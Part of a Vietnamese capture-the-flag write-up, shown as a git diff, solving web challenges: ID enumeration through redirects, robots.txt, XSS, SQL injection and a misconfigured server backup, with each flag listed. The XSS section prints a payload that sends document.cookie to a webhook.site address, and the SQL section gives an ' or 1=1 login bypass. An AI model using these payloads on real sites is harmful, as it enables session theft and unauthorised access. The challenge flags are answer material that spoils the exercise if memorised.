@@ -99,4 +99,87 @@ Sau khi nhìn lại ta phát hiện chức năng .replace() không hề lọc đ
 ###Infinite Loop
 >Vòng lặp vô hạn
 >
-Sau khi đăng nhập với 1 username:password bất kì ta sẽ được chuyển liên tục đến 
+Sau khi đăng nhập với 1 username:password bất kì ta sẽ được chuyển liên tục page với id được thay đổi liên tục => Để kiểm tra ta sử dung Burp SUite thì thấy được :
+![loop](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/67500160e2e9b5a515b19d62811f5b6420af3d93/image/loopid1.PNG)
+
+Ta gửi 1 request đến Repeater để kiểm tra từng id 0->10 thì phát hiện ra flag hoặc có thể follow redirection để chuyển hướng liên tục cho đến khi thấy flag
+![loop](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/67500160e2e9b5a515b19d62811f5b6420af3d93/image/loop_flag.png)
+
+Bạn cũng có thể code 1 script nhỏ của py để chạy test id như sau :
+```py
+import requests
+
+for i in range(0,11):
+	idd=str(i)
+	url = f"http://chal6.web.letspentest.org/check.php?id={idd}"
+	r=requests.get(url,allow_redirects=False)
+	if "Flag{" in r.text:
+		print(r.text)
+		break
+	else :
+		print("Failed id ="+ idd)
+```
+
+Flag: `Flag{Y0u_c4ptur3_m3_xD!!!}`
+
+###I am not a robot
+>robots.txt
+>
+Sau khi đọc đề mình đoán rằng bài này sẽ sử dụng **/robots.txt** thì thấy :
+![robots](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/67500160e2e9b5a515b19d62811f5b6420af3d93/image/robots1.PNG)
+
+Truy cập vào **/fl@g1337_d240c789f29416e11a3084a7b50fade5.txt** => Flag
+
+Flag: `Flag{N0_B0T_@ll0w}`
+
+###Sause
+Xem source code => Flag 
+![sause]()
+
+Flag: `Flag{Web_Sause_Delicious}`
+
+##Web Exploitation
+
+###XSS
+>Lỗ hổng XSS
+>
+Đề bài đã cho chúng ta gợi ý về lỗ hổng của bài này 
+Ta test script cơ bản của XSS : `<script>alert(1)</script>`
+=> Thì thấy trang xuất hiện thông báo 1 hiện lên ở page => Đó là dấu hiệu cho biết page này đã dính lỗi xss
+Trước hết ta tạo 1 request bằng tool : [Webhook.site](https://webhook.site/#!/02c72b46-4d85-429b-ad90-6a208d9d102f)
+Để lấy cookie ta sử dụng script sau : `<img src=x onerror=this.src='https://webhook.site/02c72b46-4d85-429b-ad90-6a208d9d102f/?'+document.cookie;>`
+
+###Ét Quy Eo
+> Lỗ hổng SQL Basic
+> 
+Cũng như bài xss đề bài đã gợi ý cho chúng ta về lỗ hổng của bài này 
+Ta test script cơ bản của SQL : `' or 1=1-- -` cho cả username và password 
+![sql](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/e157a30c9cb9b1fbdf682ae363bbd10382a7e557/image/sql.png)
+
+Ta decode base64 => flag 
+Flag: `Flag{Fr33_Styl3}` 
+
+> Query :
+>
+```sql
+SELECT username,password from users where username = ' or 1=1-- -'&password=' or 1=1-- -'
+```
+
+###Misconfiguration
+>Gà mắc phải một sai lầm không đáng có trong việc thiết lập cấu hình Web Server
+>
+Sau khi đọc gợi ý về **thiết lập cấu hình Web Server** mình đã test thử **/.htaccess** 
+![config](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/e157a30c9cb9b1fbdf682ae363bbd10382a7e557/image/config.PNG)
+
+Nhưng sau khi test thêm vài endpoint nhưng vẫn không được mình quyết định sử dụng tool DirBuster 
+![config](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/e157a30c9cb9b1fbdf682ae363bbd10382a7e557/image/config1.PNG)
+
+Sau khi chạy tool thì tìm thấy **/web.config**
+![config](https://github.com/tinasahara1/Writeup-Cookie-Arena-CTF/blob/e157a30c9cb9b1fbdf682ae363bbd10382a7e557/image/config2.PNG)
+
+Trên page ta thấy **/backup-ddmmyy.bak** thì nó tải 1 file .bak về máy 
+Sau đó sử dụng lệnh file backup-ddmmyy.bak => Thì phát hiện nó là 1 file .zip  
+Mình đổi tên file thành backup-ddmmyy.zip => unzip thì phát hiện 1 file part3.txt
+Ghép 3 phần ta được 1 flag hoàn chỉnh :
+
+Flag: `Flag{1b283f0725d536a0f217d89caca7b183}`
